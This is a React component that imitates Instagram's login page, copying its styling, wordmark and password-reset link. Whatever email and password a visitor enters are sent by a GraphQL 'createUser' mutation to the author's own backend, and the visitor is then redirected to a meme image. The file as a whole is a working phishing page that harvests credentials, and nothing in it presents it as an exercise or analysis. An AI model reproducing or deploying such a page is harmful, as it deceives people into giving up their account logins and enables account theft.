import React from 'react'
import { withRouter } from 'react-router'
import { graphql, gql } from 'react-apollo'

class CreateUserIg extends React.Component {

  static propTypes = {
    router: React.PropTypes.object.isRequired,
    createUser: React.PropTypes.func.isRequired,
    // signinUser: React.PropTypes.func.isRequired,
    data: React.PropTypes.object.isRequired,
  }

  state = {
    email: this.props.location.query.email || '',
    password: '',
    name: '',
    emailSubscription: false,
  }

  render () {
    if (this.props.data.loading) {
      return (<div>Loading</div>)
    }

    // redirect if user is logged in
    if (this.props.data.user) {
      console.warn('already logged in')
      // this.props.router.replace('/')
    }

    return (
          <section className="_tlwfg _8f735">
            <main className="_6ltyr _rnpza">
               <div className="_7x34g">
                  <article className="_7xj0z">
                     <div className="_p8ymb">
                        <div className="_nvyyp">
                           <h1 className="_du7bh _soakw coreSpriteLoggedOutWordmark">Instagram</h1>
                           <div className="_uikn3">
                               <div className="_ccek6 _i31zu">
                                  <input type="text" className="_kp5f7 _qy55y" 
                                  placeholder="Email"  onChange={(e) => this.setState({email: e.target.value})} />
                                  <div className="_j4ox0"></div>
                               </div>
                               <div className="_ccek6 _i31zu">
                                  <input type="password" className="_kp5f7 _1mdqd _qy55y" placeholder="Password" 
                                   onChange={(e) => this.setState({password: e.target.value})}/>
                                  <div className="_j4ox0"><a className="_19gtn" href="https://www.instagram.com/accounts/password/reset/">Forgot?</a></div>
                               </div>
                               <span className="_rz1lq _7k49n"><button className="_ah57t _84y62 _i46jh _rmr7s"  onClick={this.createUser}>Log in</button></span>
                           </div>
                        </div>
                        <div className="_nvyyp">
                           <p className="_dyp7q">
                             Don't have an account? <a className="_fcn8k" href="javascript:;">Sign up</a>
                           </p>
                        </div>

                     </div>
                  </article>
               </div>
            </main>
            <div className="_s1xpw _44kmz">
               <div className="_plwoo"></div>
            </div>
         </section>
    )
  }

  createUser = () => {
    const {email, password} = this.state

    this.props.createUser({variables: {email, password}})
      .then((response) => {
        window.location.href = "https://i.imgflip.com/1sevnt.jpg";
      }).catch((e) => {
        console.error(e)
        this.props.router.replace('/')
      })
  }
}

const createUser = gql`
  mutation ($email: String!, $password: String!) {
    createUser(authProvider: {email: {email: $email, password: $password}}) {
      email
    }
  }
`

const userQuery = gql`
  query {
    user {
      id
    }
  }
`

export default graphql(createUser, {name: 'createUser'})(
  graphql(userQuery, { options: { fetchPolicy: 'network-only' }})(
    withRouter(CreateUserIg))
)
